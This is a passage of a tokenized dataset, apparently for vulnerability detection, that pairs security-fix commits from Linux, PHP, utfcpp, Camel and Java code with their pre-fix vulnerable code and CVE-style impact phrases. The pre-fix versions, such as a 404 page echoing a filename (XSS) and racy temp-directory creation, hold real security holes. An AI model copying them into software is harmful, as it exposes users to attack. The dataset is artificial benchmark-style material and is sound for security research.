"The", "other", "parameters", "to", "this", "function", "are", "unused", "by", "the", "*", "capability", "security", "module", ".", "Returns", "0", "if", "this", "mapping", "should", "be", "allowed", "*", "-", "EPERM", "if", "not", ".", "*", "/", "int", "cap_file_mmap", "(", "struct", "file", "*", "file", ",", "unsigned", "long", "reqprot", ",", "unsigned", "long", "prot", ",", "unsigned", "long", "flags", ",", "unsigned", "long", "addr", ",", "unsigned", "long", "addr_only", ")", "{", "int", "ret", "=", "0", ";", "if", "(", "addr", "<", "mmap_min_addr", ")", "{", "ret", "=", "cap_capable", "(", "current", ",", "current_cred", "(", "),", "CAP_SYS_RAWIO", ",", "SECURITY_CAP_AUDIT", ")", ";", "/", "*", "set", "PF_SUPERPRIV", "if", "it", "turns", "out", "we", "allow", "the", "low", "mmap", "*", "/", "if", "(", "ret", "=", "=", "0", ")", "current", "-", ">", "flags", "|", "=", "PF_SUPERPRIV", ";", "}", "return", "ret", ";", "}</s>if", "(", "(", "addr", "<", "mmap_min_addr", ")", "&", "&", "!", "capable", "(", "CAP_SYS_RAWIO", ")", ")", "return", "-", "EACCES", ";", "return", "0", ";", "static", "int", "cap_file_mmap", "(", "struct", "file", "*", "file", ",", "unsigned", "long", "reqprot", ",", "unsigned", "long", "prot", ",", "unsigned", "long", "flags", ",", "unsigned", "long", "addr", ",", "unsigned", "long", "addr_only", ")", "{", "if", "(", "(", "addr", "<", "mmap_min_addr", ")", "&", "&", "!", "capable", "(", "CAP_SYS_RAWIO", ")", ")", "return", "-", "EACCES", ";", "return", "0", ";", "}"], "docstring_tokens": ["gain", "elevated", "privileges", "on", "the", "system"]}
{"contents": ["proc:", "prevent", "stacking", "filesystems", "on", "top", "This", "prevents", "stacking", "filesystems", "(ecryptfs", "and", "overlayfs)", "from", "using", "procfs", "as", "lower", "filesystem.", "There", "is", "too", "much", "magic", "going", "on", "inside", "procfs,", "and", "there", "is", "no", "good", "reason", "to", "stack", "stuff", "on", "top", "of", "procfs.", "(For", "example,", "procfs", "does", "access", "checks", "in", "VFS", "open", "handlers,", "and", "ecryptfs", "by", "design", "calls", "open", "handlers", "from", "a", "kernel", "thread", "that", "doesn't", "drop", "privileges", "or", "so.)", "Signed-off-by:", "Jann", "Horn", "<jannh@google.com>", "Cc:", "stable@vger.kernel.org", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["/", "*", "*", "procfs", "isn", "'", "t", "actually", "a", "stacking", "filesystem", ";", "however", ",", "there", "is", "*", "too", "much", "magic", "going", "on", "inside", "it", "to", "permit", "stacking", "things", "on", "*", "top", "of", "it", "*", "/", "sb", "-", ">", "s_stack_depth", "=", "FILESYSTEM_MAX_STACK_DEPTH", ";</s>"], "docstring_tokens": ["overflow", "a", "buffer", "and", "execute", "arbitrary", "code", "on", "the", "system", "or", "cause", "the", "application", "to", "crash"]}
{"contents": ["Update", "utfcpp", "to", "v2.3.6", "Fixes", "#2657", "Incorporates", "the", "following", "utfcpp", "patches:", "1.", "Sass", "addition", "of", "`retreat`.", "https://github.com/nemtrif/utfcpp/pull/20", "2.", "Fix", "for", "`replace_invalid`", "throwing", "on", "incomplete", "sequence", "at", "the", "end", "of", "the", "input.", "https://github.com/nemtrif/utfcpp/pull/21"], "code_tokens": ["/", "/", "Copyright", "2006", "-", "2016", "Nemanja", "Trifunovic", "invalid_code_point", "(", "uint32_t", "codepoint", ")", ":", "cp", "(", "codepoint", ")", "{", "}", "out", "=", "utf8", ":", ":", "append", "(", "replacement", ",", "out", ")", ";", "start", "=", "end", ";", "break", ";", "+", "+", "start", ";", "void", "retreat", "(", "octet_iterator", "&", "it", ",", "distance_type", "n", ",", "octet_iterator", "end", ")", "utf8", ":", ":", "prior", "(", "it", ",", "end", ")", ";", "while", "(", "start", "<", "end", ")", "{", "while", "(", "start", "<", "end", ")", "const", "octet_iterator", "&", "rangestart", ",", "const", "octet_iterator", "&", "rangeend", ")", ":", "it", "(", "octet_it", ")", ",", "range_start", "(", "rangestart", ")", ",", "range_end", "(", "rangeend", ")", "if", "(", "it", "=", "=", "end", ")", "return", "NOT_ENOUGH_ROOM", ";</s>/", "/", "Copyright", "2006", "Nemanja", "Trifunovic", "invalid_code_point", "(", "uint32_t", "cp", ")", ":", "cp", "(", "cp", ")", "{", "}", "throw", "not_enough_room", "(", ");", "void", "retreat", "(", "octet_iterator", "&", "it", ",", "distance_type", "n", ",", "octet_iterator", "start", ")", "utf8", ":", ":", "prior", "(", "it", ",", "start", ")", ";", "while", "(", "start", "!", "=", "end", ")", "{", "while", "(", "start", "!", "=", "end", ")", "const", "octet_iterator", "&", "range_start", ",", "const", "octet_iterator", "&", "range_end", ")", ":", "it", "(", "octet_it", ")", ",", "range_start", "(", "range_start", ")", ",", "range_end", "(", "range_end", ")"], "docstring_tokens": ["cause", "a", "denial-of-service", "resulting", "from", "a", "heap-based", "buffer", "over-read"]}
{"contents": ["Fix", "bug", "#74782:", "remove", "file", "name", "from", "output", "to", "avoid", "XSS"], "code_tokens": ["echo", "\"", "<", "html", ">", "\\", "n", "<", "head", ">", "\\", "n", "<", "title", ">", "File", "Not", "Found", "<", "title", ">", "\\", "n", "<", "/", "head", ">", "\\", "n", "<", "body", ">", "\\", "n", "<", "h1", ">", "404", "-", "File", "Not", "Found", "<", "/", "h1", ">", "\\", "n", "<", "/", "body", ">", "\\", "n", "<", "/", "html", ">", "\";", "static", "const", "char", "newstub1_1", "[", "]", "=", "\"", "Extract_Phar", ":", ":$", "temp", ")", ")", "{", "\\", "nheader", "(", "'", "HTTP", "/", "1", ".", "0", "404", "Not", "Found", "'", ");", "\\", "necho", "\\", "\"<", "html", ">", "\\\\", "n", "<", "head", ">", "\\\\", "n", "<", "title", ">", "File", "Not", "Found", "<", "title", ">", "\\\\", "n", "<", "/", "head", ">", "\\\\", "n", "<", "body", ">", "\\\\", "n", "<", "h1", ">", "404", "-", "File", "Not", "Found", "<", "/", "h1", ">", "\\\\", "n", "<", "/", "body", ">", "\\\\", "n", "<", "/", "html", ">", "\\\"", ";\\", "nexit", ";", "\\", "n", "}", "\\", "n", "$", "b", "=", "pathinfo", "(", "$", "a", ")", ";\\", "nif", "(", "!", "isset", "(", "$", "b", "[", "'", "extension", "'", "])", ")", "{", "\\", "nheader", "(", "'", "Content", "-", "Type", ":", "text", "/", "plain", "'", ");", "\\", "nheader", "(", "'", "Content", "-", "Length", ":", "'", ".", "filesize", "(", "$", "a", ")", ");", "\\", "nreadfile", "(", "$", "a", ")", ";\\", "nexit", ";", "\\", "n", "}", "\\", "nif", "(", "isset", "(", "$", "mimes", "[", "$", "b", "[", "'", "extension", "'", "]]", "))", "{", "\\", "nif", "(", "$", "mimes", "[", "$", "b", "[", "'", "extension", "'", "]]", "=", "==", "1", ")", "{", "\\", "ninclude", "$", "a", ";", "\\", "nexit", ";", "\\", "n", "}", "\\", "nif", "(", "$", "mimes", "[", "$", "b", "[", "'", "extension", "'", "]]", "=", "==", "2", ")", "{", "\\", "nhighlight_file", "(", "$", "a", ")", ";\\", "nexit", ";", "\\", "n", "}", "\\", "nheader", "(", "'", "Content", "-", "Type", ":", "'", ".", "$", "mimes", "[", "$", "b", "[", "'", "extension", "'", "]]", ");", "\\", "nheader", "(", "'", "Content", "-", "Length", ":", "'", ".", "filesize", "(", "$", "a", ")", ");", "\\", "nreadfile", "(", "$", "a", ")", ";\\", "nexit", ";", "\\", "n", "}", "\\", "n", "}", "\\", "n", "\\", "nclass", "Extract_Phar", "\\", "n", "{", "\\", "nstatic", "$", "temp", ";", "\\", "nstatic", "$", "origdir", ";", "\\", "nconst", "GZ", "=", "0x1000", ";", "\\", "nconst", "BZ2", "=", "0x2000", ";", "\\", "nconst", "MASK", "=", "0x3000", ";", "\\", "nconst", "START", "=", "'", "\";", "static", "const", "int", "newstub_len", "=", "6655", ";", "6675", "int", "(", "6673", ")", "int", "(", "6673", ")", "int", "(", "6673", ")", "string", "(", "6673", ")", "\"", "<?", "php", "echo", "\"", "<", "html", ">", "\\", "n", "<", "head", ">", "\\", "n", "<", "title", ">", "File", "Not", "Found", "<", "title", ">", "\\", "n", "<", "/", "head", ">", "\\", "n", "<", "body", ">", "\\", "n", "<", "h1", ">", "404", "-", "File", "Not", "Found", "<", "/", "h1", ">", "\\", "n", "<", "/", "body", ">", "\\", "n", "<", "/", "html", ">", "\";", "const", "LEN", "=", "6675", ";", "string", "(", "6684", ")", "\"", "<?", "php", "echo", "\"", "<", "html", ">", "\\", "n", "<", "head", ">", "\\", "n", "<", "title", ">", "File", "Not", "Found", "<", "title", ">", "\\", "n", "<", "/", "head", ">", "\\", "n", "<", "body", ">", "\\", "n", "<", "h1", ">", "404", "-", "File", "Not", "Found", "<", "/", "h1", ">", "\\", "n", "<", "/", "body", ">", "\\", "n", "<", "/", "html", ">", "\";", "const", "LEN", "=", "6686", ";", "int", "(", "7064", ")", "string", "(", "6686", ")", "\"", "<?", "php", "echo", "\"", "<", "html", ">", "\\", "n", "<", "head", ">", "\\", "n", "<", "title", ">", "File", "Not", "Found", "<", "title", ">", "\\", "n", "<", "/", "head", ">", "\\", "n", "<", "body", ">", "\\", "n", "<", "h1", ">", "404", "-", "File", "Not", "Found", "<", "/", "h1", ">", "\\", "n", "<", "/", "body", ">", "\\", "n", "<", "/", "html", ">", "\";", "const", "LEN", "=", "6688", ";", "int", "(", "7064", ")", "int", "(", "6675", ")", "int", "(", "6675", ")", "string", "(", "6675", ")", "\"", "<?", "php", "echo", "\"", "<", "html", ">", "\\", "n", "<", "head", ">", "\\", "n", "<", "title", ">", "File", "Not", "Found", "<", "title", ">", "\\", "n", "<", "/", "head", ">", "\\", "n", "<", "body", ">", "\\", "n", "<", "h1", ">", "404", "-", "File", "Not", "Found", "<", "/", "h1", ">", "\\", "n", "<", "/", "body", ">", "\\", "n", "<", "/", "html", ">", "\";", "const", "LEN", "=", "6675", ";", "string", "(", "6686", ")", "\"", "<?", "php", "echo", "\"", "<", "html", ">", "\\", "n", "<", "head", ">", "\\", "n", "<", "title", ">", "File", "Not", "Found", "<", "title", ">", "\\", "n", "<", "/", "head", ">", "\\", "n", "<", "body", ">", "\\", "n", "<", "h1", ">", "404", "-", "File", "Not", "Found", "<", "/", "h1", ">", "\\", "n", "<", "/", "body", ">", "\\", "n", "<", "/", "html", ">", "\";", "const", "LEN", "=", "6686", ";", "string", "(", "6688", ")", "\"", "<?", "php", "echo", "\"", "<", "html", ">", "\\", "n", "<", "head", ">", "\\", "n", "<", "title", ">", "File", "Not", "Found", "<", "title", ">", "\\", "n", "<", "/", "head", ">", "\\", "n", "<", "body", ">", "\\", "n", "<", "h1", ">", "404", "-", "File", "Not", "Found", "<", "/", "h1", ">", "\\", "n", "<", "/", "body", ">", "\\", "n", "<", "/", "html", ">", "\";", "const", "LEN", "=", "6688", ";", "int", "(", "7066", ")", "int", "(", "6673", ")", "int", "(", "6673", ")", "int", "(", "6673", ")", "int", "(", "6673", ")", "int", "(", "6673", ")", "int", "(", "6673", ")", "int", "(", "6673", ")", "int", "(", "6673", ")", "int", "(", "6673", ")", "int", "(", "6673", ")", "int", "(", "6673", ")", "int", "(", "6673", ")", "int", "(", "6673", ")", "int", "(", "6673", ")", "int", "(", "6673", ")</s>echo", "\"", "<", "html", ">", "\\", "n", "<", "head", ">", "\\", "n", "<", "title", ">", "File", "Not", "Found", "<", "title", ">", "\\", "n", "<", "/", "head", ">", "\\", "n", "<", "body", ">", "\\", "n", "<", "h1", ">", "404", "-", "File", "\"", ",", "$", "pt", ",", "\"", "Not", "Found", "<", "/", "h1", ">", "\\", "n", "<", "/", "body", ">", "\\", "n", "<", "/", "html", ">", "\";", "static", "const", "char", "newstub1_1", "[", "]", "=", "\"", "Extract_Phar", ":", ":$", "temp", ")", ")", "{", "\\", "nheader", "(", "'", "HTTP", "/", "1", ".", "0", "404", "Not", "Found", "'", ");", "\\", "necho", "\\", "\"<", "html", ">", "\\\\", "n", "<", "head", ">", "\\\\", "n", "<", "title", ">", "File", "Not", "Found", "<", "title", ">", "\\\\", "n", "<", "/", "head", ">", "\\\\", "n", "<", "body", ">", "\\\\", "n", "<", "h1", ">", "404", "-", "File", "\\", "\",", "$", "pt", ",", "\\", "\"", "Not", "Found", "<", "/", "h1", ">", "\\\\", "n", "<", "/", "body", ">", "\\\\", "n", "<", "/", "html", ">", "\\\"", ";\\", "nexit", ";", "\\", "n", "}", "\\", "n", "$", "b", "=", "pathinfo", "(", "$", "a", ")", ";\\", "nif", "(", "!", "isset", "(", "$", "b", "[", "'", "extension", "'", "])", ")", "{", "\\", "nheader", "(", "'", "Content", "-", "Type", ":", "text", "/", "plain", "'", ");", "\\", "nheader", "(", "'", "Content", "-", "Length", ":", "'", ".", "filesize", "(", "$", "a", ")", ");", "\\", "nreadfile", "(", "$", "a", ")", ";\\", "nexit", ";", "\\", "n", "}", "\\", "nif", "(", "isset", "(", "$", "mimes", "[", "$", "b", "[", "'", "extension", "'", "]]", "))", "{", "\\", "nif", "(", "$", "mimes", "[", "$", "b", "[", "'", "extension", "'", "]]", "=", "==", "1", ")", "{", "\\", "ninclude", "$", "a", ";", "\\", "nexit", ";", "\\", "n", "}", "\\", "nif", "(", "$", "mimes", "[", "$", "b", "[", "'", "extension", "'", "]]", "=", "==", "2", ")", "{", "\\", "nhighlight_file", "(", "$", "a", ")", ";\\", "nexit", ";", "\\", "n", "}", "\\", "nheader", "(", "'", "Content", "-", "Type", ":", "'", ".", "$", "mimes", "[", "$", "b", "[", "'", "extension", "'", "]]", ");", "\\", "nheader", "(", "'", "Content", "-", "Length", ":", "'", ".", "filesize", "(", "$", "a", ")", ");", "\\", "nreadfile", "(", "$", "a", ")", ";\\", "nexit", ";", "\\", "n", "}", "\\", "n", "}", "\\", "n", "\\", "nclass", "Extract_Phar", "\\", "n", "{", "\\", "nstatic", "$", "temp", ";", "\\", "nstatic", "$", "origdir", ";", "\\", "nconst", "GZ", "=", "0x1000", ";", "\\", "nconst", "BZ2", "=", "0x2000", ";", "\\", "nconst", "MASK", "=", "0x3000", ";", "\\", "nconst", "START", "=", "'", "\";", "static", "const", "int", "newstub_len", "=", "6665", ";", "6685", "-", "-", "EXPECT", "int", "(", "6683", ")", "int", "(", "6683", ")", "-", "-", "EXPECT", "int", "(", "6683", ")", "-", "-", "EXPECT", "string", "(", "6683", ")", "\"", "<?", "php", "echo", "\"", "<", "html", ">", "\\", "n", "<", "head", ">", "\\", "n", "<", "title", ">", "File", "Not", "Found", "<", "title", ">", "\\", "n", "<", "/", "head", ">", "\\", "n", "<", "body", ">", "\\", "n", "<", "h1", ">", "404", "-", "File", "\"", ",", "$", "pt", ",", "\"", "Not", "Found", "<", "/", "h1", ">", "\\", "n", "<", "/", "body", ">", "\\", "n", "<", "/", "html", ">", "\";", "const", "LEN", "=", "6685", ";", "string", "(", "6694", ")", "\"", "<?", "php", "echo", "\"", "<", "html", ">", "\\", "n", "<", "head", ">", "\\", "n", "<", "title", ">", "File", "Not", "Found", "<", "title", ">", "\\", "n", "<", "/", "head", ">", "\\", "n", "<", "body", ">", "\\", "n", "<", "h1", ">", "404", "-", "File", "\"", ",", "$", "pt", ",", "\"", "Not", "Found", "<", "/", "h1", ">", "\\", "n", "<", "/", "body", ">", "\\", "n", "<", "/", "html", ">", "\";", "const", "LEN", "=", "6696", ";", "int", "(", "7074", ")", "string", "(", "6696", ")", "\"", "<?", "php", "echo", "\"", "<", "html", ">", "\\", "n", "<", "head", ">", "\\", "n", "<", "title", ">", "File", "Not", "Found", "<", "title", ">", "\\", "n", "<", "/", "head", ">", "\\", "n", "<", "body", ">", "\\", "n", "<", "h1", ">", "404", "-", "File", "\"", ",", "$", "pt", ",", "\"", "Not", "Found", "<", "/", "h1", ">", "\\", "n", "<", "/", "body", ">", "\\", "n", "<", "/", "html", ">", "\";", "const", "LEN", "=", "6698", ";", "int", "(", "7074", ")", "int", "(", "6685", ")", "int", "(", "6685", ")", "-", "-", "EXPECT", "string", "(", "6685", ")", "\"", "<?", "php", "echo", "\"", "<", "html", ">", "\\", "n", "<", "head", ">", "\\", "n", "<", "title", ">", "File", "Not", "Found", "<", "title", ">", "\\", "n", "<", "/", "head", ">", "\\", "n", "<", "body", ">", "\\", "n", "<", "h1", ">", "404", "-", "File", "\"", ",", "$", "pt", ",", "\"", "Not", "Found", "<", "/", "h1", ">", "\\", "n", "<", "/", "body", ">", "\\", "n", "<", "/", "html", ">", "\";", "const", "LEN", "=", "6685", ";", "string", "(", "6696", ")", "\"", "<?", "php", "echo", "\"", "<", "html", ">", "\\", "n", "<", "head", ">", "\\", "n", "<", "title", ">", "File", "Not", "Found", "<", "title", ">", "\\", "n", "<", "/", "head", ">", "\\", "n", "<", "body", ">", "\\", "n", "<", "h1", ">", "404", "-", "File", "\"", ",", "$", "pt", ",", "\"", "Not", "Found", "<", "/", "h1", ">", "\\", "n", "<", "/", "body", ">", "\\", "n", "<", "/", "html", ">", "\";", "const", "LEN", "=", "6696", ";", "string", "(", "6698", ")", "\"", "<?", "php", "echo", "\"", "<", "html", ">", "\\", "n", "<", "head", ">", "\\", "n", "<", "title", ">", "File", "Not", "Found", "<", "title", ">", "\\", "n", "<", "/", "head", ">", "\\", "n", "<", "body", ">", "\\", "n", "<", "h1", ">", "404", "-", "File", "\"", ",", "$", "pt", ",", "\"", "Not", "Found", "<", "/", "h1", ">", "\\", "n", "<", "/", "body", ">", "\\", "n", "<", "/", "html", ">", "\";", "const", "LEN", "=", "6698", ";", "int", "(", "7076", ")", "-", "-", "EXPECT", "int", "(", "6683", ")", "int", "(", "6683", ")", "int", "(", "6683", ")", "-", "-", "EXPECT", "int", "(", "6683", ")", "int", "(", "6683", ")", "int", "(", "6683", ")", "-", "-", "EXPECT", "int", "(", "6683", ")", "int", "(", "6683", ")", "int", "(", "6683", ")", "-", "-", "EXPECT", "int", "(", "6683", ")", "int", "(", "6683", ")", "int", "(", "6683", ")", "-", "-", "EXPECT", "int", "(", "6683", ")", "int", "(", "6683", ")", "int", "(", "6683", ")"], "docstring_tokens": ["steal", "the", "victim's", "cookie-based", "authentication", "credentials"]}
{"contents": ["[NETFILTER]:", "nfnetlink_log:", "fix", "NULL", "pointer", "dereference", "Fix", "the", "nasty", "NULL", "dereference", "on", "multiple", "packets", "per", "netlink", "message.", "BUG:", "unable", "to", "handle", "kernel", "NULL", "pointer", "dereference", "at", "virtual", "address", "00000004", "printing", "eip:", "f8a4b3bf", "*pde", "=", "00000000", "Oops:", "0002", "[#1]", "SMP", "Modules", "linked", "in:", "nfnetlink_log", "ipt_ttl", "ipt_REDIRECT", "xt_tcpudp", "iptable_nat", "nf_nat", "nf_conntrack_ipv4", "xt_state", "ipt_ipp2p", "xt_NFLOG", "xt_hashlimit", "ip6_tables", "iptable_filter", "xt_multiport", "xt_mark", "ipt_set", "iptable_raw", "xt_MARK", "iptable_mangle", "ip_tables", "cls_fw", "cls_u32", "sch_esfq", "sch_htb", "ip_set_ipmap", "ip_set", "ipt_ULOG", "x_tables", "dm_snapshot", "dm_mirror", "loop", "e1000", "parport_pc", "parport", "e100", "floppy", "ide_cd", "cdrom", "CPU:", "0", "EIP:", "0060:[<f8a4b3bf>]", "Not", "tainted", "VLI", "EFLAGS:", "00010206", "(2.6.20", "#5)", "EIP", "is", "at", "__nfulnl_send+0x24/0x51", "[nfnetlink_log]", "eax:", "00000000", "ebx:", "f2b5cbc0", "ecx:", "c03f5f54", "edx:", "c03f4000", "esi:", "f2b5cbc8", "edi:", "c03f5f54", "ebp:", "f8a4b3ec", "esp:", "c03f5f30", "ds:", "007b", "es:", "007b", "ss:", "0068", "Process", "swapper", "(pid:", "0,", "ti=c03f4000", "task=c03bece0", "task.ti=c03f4000)", "Stack:", "f2b5cbc0", "f8a4b401", "00000100", "c0444080", "c012af49", "00000000", "f6f19100", "f6f19000", "c1707800", "c03f5f54", "c03f5f54", "00000123", "00000021", "c03e8d08", "c0426380", "00000009", "c0126932", "00000000", "00000046", "c03e9980", "c03e6000", "0047b007", "c01269bd", "00000000", "Call", "Trace:", "[<f8a4b401>]", "nfulnl_timer+0x15/0x25", "[nfnetlink_log]", "[<c012af49>]", "run_timer_softirq+0x10a/0x164", "[<c0126932>]", "__do_softirq+0x60/0xba", "[<c01269bd>]", "do_softirq+0x31/0x35", "[<c0104f6e>]", "do_IRQ+0x62/0x74", "[<c01036cb>]", "common_interrupt+0x23/0x28", "[<c0101018>]", "default_idle+0x0/0x3f", "[<c0101045>]", "default_idle+0x2d/0x3f", "[<c01010fa>]", "cpu_idle+0xa0/0xb9", "[<c03fb7f5>]", "start_kernel+0x1a8/0x1ac", "[<c03fb293>]", "unknown_bootoption+0x0/0x181", "=======================", "Code:", "5e", "5f", "5b", "5e", "5f", "5d", "c3", "53", "89", "c3", "8d", "40", "1c", "83", "7b", "1c", "00", "74", "05", "e8", "2c", "ee", "6d", "c7", "83", "7b", "14", "00", "75", "04", "31", "c0", "eb", "34", "83", "7b", "10", "01", "76", "09", "8b", "43", "18", "<66>", "c7", "40", "04", "03", "00", "8b", "53", "34", "8b", "43", "14", "b9", "40", "00", "00", "00", "e8", "08", "9a", "84", "EIP:", "[<f8a4b3bf>]", "__nfulnl_send+0x24/0x51", "[nfnetlink_log]", "SS:ESP", "0068:c03f5f30", "<0>Kernel", "panic", "-", "not", "syncing:", "Fatal", "exception", "in", "interrupt", "<0>Rebooting", "in", "5", "seconds..", "Panic", "no", "more!", "Signed-off-by:", "Micha", "Mirosaw", "<mirq-linux@rere.qmqm.pl>", "Signed-off-by:", "Patrick", "McHardy", "<kaber@trash.net>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["inst", "-", ">", "lastnlh", "=", "nlh", ";</s>"], "docstring_tokens": ["a", "kernel", "panic", "resulting", "in", "a", "denial", "of", "service"]}
{"contents": ["/proc/iomem:", "only", "expose", "physical", "resource", "addresses", "to", "privileged", "users", "In", "commit", "c4004b02f8e5b", "(\"x86:", "remove", "the", "kernel", "code/data/bss", "resources", "from", "/proc/iomem\")", "I", "was", "hoping", "to", "remove", "the", "phyiscal", "kernel", "address", "data", "from", "/proc/iomem", "entirely,", "but", "that", "had", "to", "be", "reverted", "because", "some", "system", "programs", "actually", "use", "it.", "This", "limits", "all", "the", "detailed", "resource", "information", "to", "properly", "credentialed", "users", "instead.", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["unsigned", "long", "long", "start", ",", "end", ";", "if", "(", "file_ns_capable", "(", "m", "-", ">", "file", ",", "&", "init_user_ns", ",", "CAP_SYS_ADMIN", ")", ")", "{", "start", "=", "r", "-", ">", "start", ";", "end", "=", "r", "-", ">", "end", ";", "}", "else", "{", "start", "=", "end", "=", "0", ";", "}", "width", ",", "start", ",", "width", ",", "end", ",</s>width", ",", "(", "unsigned", "long", "long", ")", "r", "-", ">", "start", ",", "width", ",", "(", "unsigned", "long", "long", ")", "r", "-", ">", "end", ","], "docstring_tokens": ["obtain", "sensitive", "information", "from", "the", "system"]}
{"contents": ["taskstats:", "don't", "allow", "duplicate", "entries", "in", "listener", "mode", "Currently", "a", "single", "process", "may", "register", "exit", "handlers", "unlimited", "times.", "It", "may", "lead", "to", "a", "bloated", "listeners", "chain", "and", "very", "slow", "process", "terminations.", "Eg", "after", "10KK", "sent", "TASKSTATS_CMD_ATTR_REGISTER_CPUMASKs", "~300", "Mb", "of", "kernel", "memory", "is", "stolen", "for", "the", "handlers", "chain", "and", "\"time", "id\"", "shows", "2-7", "seconds", "instead", "of", "normal", "0.003.", "It", "makes", "it", "possible", "to", "exhaust", "all", "kernel", "memory", "and", "to", "eat", "much", "of", "CPU", "time", "by", "triggerring", "numerous", "exits", "on", "a", "single", "CPU.", "The", "patch", "limits", "the", "number", "of", "times", "a", "single", "process", "may", "register", "itself", "on", "a", "single", "CPU", "to", "one.", "One", "little", "issue", "is", "kept", "unfixed", "-", "as", "taskstats_exit()", "is", "called", "before", "exit_files()", "in", "do_exit(),", "the", "orphaned", "listener", "entry", "(if", "it", "was", "not", "explicitly", "deregistered)", "is", "kept", "until", "the", "next", "someone's", "exit()", "and", "implicit", "deregistration", "in", "send_cpu_listeners().", "So,", "if", "a", "process", "registered", "itself", "as", "a", "listener", "exits", "and", "the", "next", "spawned", "process", "gets", "the", "same", "pid,", "it", "would", "inherit", "taskstats", "attributes.", "Signed-off-by:", "Vasiliy", "Kulikov", "<segooon@gmail.com>", "Cc:", "Balbir", "Singh", "<bsingharora@gmail.com>", "Cc:", "<stable@kernel.org>", "Signed-off-by:", "Andrew", "Morton", "<akpm@linux-foundation.org>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["struct", "listener", "*", "s", ",", "*", "tmp", ",", "*", "s2", ";", "s", "=", "NULL", ";", "if", "(", "!", "s", ")", "s", "=", "kmalloc_node", "(", "sizeof", "(", "struct", "listener", ")", ",", "GFP_KERNEL", ",", "cpu_to_node", "(", "cpu", ")", ");", "list_for_each_entry_safe", "(", "s2", ",", "tmp", ",", "&", "listeners", "-", ">", "list", ",", "list", ")", "{", "if", "(", "s2", "-", ">", "pid", "=", "=", "pid", ")", "goto", "next_cpu", ";", "}", "s", "=", "NULL", ";", "next_cpu", ":", "kfree", "(", "s", ")", ";</s>struct", "listener", "*", "s", ",", "*", "tmp", ";", "s", "=", "kmalloc_node", "(", "sizeof", "(", "struct", "listener", ")", ",", "GFP_KERNEL", ",", "cpu_to_node", "(", "cpu", ")", ");"], "docstring_tokens": ["a", "bloated", "listeners", "chain", "and", "very", "slow", "process", "terminations"]}
{"contents": ["createTempDirectory", "atomically"], "code_tokens": ["File", "dir", "=", "Files", ".", "createTempDirectory", "(", "jar", ".", "getName", "(", ")", "+", "\"", ".", "dir", "\"", ").", "toFile", "(", ");</s>File", "dir", "=", "File", ".", "createTempFile", "(", "jar", ".", "getName", "(", "),", "\"", ".", "dir", "\"", ");", "dir", ".", "delete", "(", ");", "dir", ".", "mkdirs", "(", ");"], "docstring_tokens": ["gain", "elevated", "privileges"]}
{"contents": ["CAMEL-10567:", "Camel-Jackson:", "Add", "an", "option", "to", "allow", "the", "UnmarshallType", "header", "use"], "code_tokens": ["@", "XmlAttribute", "private", "Boolean", "allowUnmarshallType", ";", "public", "Boolean", "getAllowUnmarshallType", "(", ")", "{", "return", "allowUnmarshallType", ";", "}", "/", "**", "*", "If", "enabled", "then", "Jackson", "is", "allowed", "to", "attempt", "to", "use", "the", "CamelJacksonUnmarshalType", "header", "during", "the", "unmarshalling", ".", "*", "<", "p", "/", ">", "*", "This", "should", "only", "be", "enabled", "when", "desired", "to", "be", "used", ".", "*", "/", "public", "void", "setAllowUnmarshallType", "(", "Boolean", "allowUnmarshallType", ")", "{", "this", ".", "allowUnmarshallType", "=", "allowUnmarshallType", ";", "}", "if", "(", "allowUnmarshallType", "!", "=", "null", ")", "{", "setProperty", "(", "camelContext", ",", "dataFormat", ",", "\"", "allowUnmarshallType", "\"", ",", "allowUnmarshallType", ")", ";", "}</s>"], "docstring_tokens": ["in", "the", "worst", "case", "trigger", "command", "or", "remote", "code", "execution"]}
{"contents": ["x86,", "kvm:", "Clear", "paravirt_enabled", "on", "KVM", "guests", "for", "espfix32's", "benefit", "paravirt_enabled", "has", "the", "following", "effects:", "-", "Disables", "the", "F00F", "bug", "workaround", "warning.", "There", "is", "no", "F00F", "bug", "workaround", "any", "more", "because", "Linux's", "standard", "IDT", "handling", "already", "works", "around", "the", "F00F", "bug,", "but", "the", "warning", "still", "exists.", "This", "is", "only", "cosmetic,", "and,", "in", "any", "event,", "there", "is", "no", "such", "thing", "as", "KVM", "on", "a", "CPU", "with", "the", "F00F", "bug.", "-", "Disables", "32-bit", "APM", "BIOS", "detection.", "On", "a", "KVM", "paravirt", "system,", "there", "should", "be", "no", "APM", "BIOS", "anyway.", "-", "Disables", "tboot.", "I", "think", "that", "the", "tboot", "code", "should", "check", "the", "CPUID", "hypervisor", "bit", "directly", "if", "it", "matters.", "-", "paravirt_enabled", "disables", "espfix32.", "espfix32", "should", "*not*", "be", "disabled", "under", "KVM", "paravirt.", "The", "last", "point", "is", "the", "purpose", "of", "this", "patch.", "It", "fixes", "a", "leak", "of", "the", "high", "16", "bits", "of", "the", "kernel", "stack", "address", "on", "32-bit", "KVM", "paravirt", "guests.", "Fixes", ".", "Cc:", "stable@vger.kernel.org", "Suggested-by:", "Konrad", "Rzeszutek", "Wilk", "<konrad.wilk@oracle.com>", "Signed-off-by:", "Andy", "Lutomirski", "<luto@amacapital.net>", "Signed-off-by:", "Paolo", "Bonzini", "<pbonzini@redhat.com>"], "code_tokens": ["/", "*", "*", "KVM", "isn", "'", "t", "paravirt", "in", "the", "sense", "of", "paravirt_enabled", ".", "A", "KVM", "*", "guest", "kernel", "works", "like", "a", "bare", "metal", "kernel", "with", "additional", "*", "features", ",", "and", "paravirt_enabled", "is", "about", "features", "that", "are", "*", "missing", ".", "*", "/", "pv_info", ".", "paravirt_enabled", "=", "0", ";</s>pv_info", ".", "paravirt_enabled", "=", "1", ";", "pv_info", ".", "paravirt_enabled", "=", "1", ";"], "docstring_tokens": ["bypass", "the", "ASLR", "protection", "mechanism"]}
